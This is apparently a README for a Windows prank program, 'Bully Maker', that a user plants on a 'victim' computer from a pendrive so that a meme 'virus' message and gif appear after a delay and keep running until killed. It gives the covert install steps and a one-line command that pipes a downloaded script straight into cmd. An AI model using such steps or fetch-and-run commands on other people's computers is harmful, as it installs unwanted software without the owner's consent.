# Bully Maker

A program that bullies the victim computer with a meme albanian virus and a sussy hacker gif

Inspiration for albanian virus:
https://www.reddit.com/r/funny/comments/3l65rp/albanian_virus/

## Requirements
- Windows operating system
- Access to the victim computer for a few minutes

## Usage

- Copy the setup.bat and bully.gif to a pendrive
- Open the pendrive in the victim's computer and run the setup file
- Enter the time you want the program to wait, as you would wish the program to
run while the computer is being used. the default waiting time is 120 seconds
that is 2 minutes.
- After the setup is completed unplug the pendrive, and after the timeout is 
completed, the meme virus will detonate.

## FAQs
1) Is this harmful?
A) Not really

2) How to stop the program?
A) The program doesn't stop by itself, you will need open task manager and kill the vbs task.
If you cannot do that, the only option is to restart the computer.

3) How to uninstall the virus?
A) Go to the temp folder by typing `cd %tmp%` and delete the folder named
bully by running `rmdir /s bully`

## Miscellaneous
If you do not wish to use a pendrive and the victim computer has internet connection
you can also run the below command in cmd

`curl -s | cmd`
